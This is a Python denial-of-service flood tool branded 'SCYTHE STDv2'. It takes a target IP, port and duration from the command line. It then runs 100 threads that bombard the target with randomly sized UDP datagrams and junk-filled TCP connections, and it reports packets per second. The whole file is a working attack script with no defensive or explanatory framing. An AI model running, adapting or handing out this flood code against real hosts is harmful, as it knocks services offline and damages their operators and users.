# SCYTHE STDv2 v2.1
import sys, socket, time, random, threading
if len(sys.argv) < 4: print('Usage: python3 stdv2.py <ip> <port> <time> [threads]'); sys.exit(1)
ip, port, duration = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
print(f'[SCYTHE] STDv2: {ip}:{port} | {duration}s')
total = 0
lock = threading.Lock()
def flood():
  global total
  end = time.time() + duration
  while time.time() < end:
    try:
      size = random.randint(64, 65500)
      udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      udp.bind(('0.0.0.0', random.randint(1024, 65535)))
      udp.sendto(random._urandom(size), (ip, port)); udp.close()
      tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      tcp.bind(('0.0.0.0', random.randint(1024, 65535)))
      tcp.settimeout(1)
      try: tcp.connect((ip, port)); tcp.send(random._urandom(1024)); tcp.close()
      except: pass
      with lock: total += 2
    except: pass
for _ in range(100):
  threading.Thread(target=flood, daemon=True).start()
start = time.time()
while time.time() - start < duration:
  print(f'[STDv2] Packets: {total} | RPS: {int(total/max(1,time.time()-start))} | Elapsed: {time.time()-start:.1f}s')
  time.sleep(1)
print(f'[STDv2] Completed: {total} packets')